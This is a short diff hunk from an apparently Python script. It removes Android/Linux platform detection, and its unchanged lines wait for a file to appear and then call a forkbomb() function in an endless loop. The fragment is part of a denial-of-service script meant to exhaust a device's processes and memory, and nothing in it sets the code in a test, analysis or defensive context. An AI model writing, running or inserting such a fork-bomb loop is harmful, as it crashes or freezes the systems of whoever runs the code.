@@ -12,11 +12,5 @@ else:
   pass
 while not os.path.isfile(file):
   time.sleep(1)
-if platform.system() == "Android":
-  _os = "android"
-elif platform.system() == "Linux":
-  _os = "linux"
-else:
-  pass
 while True:
   forkbomb()
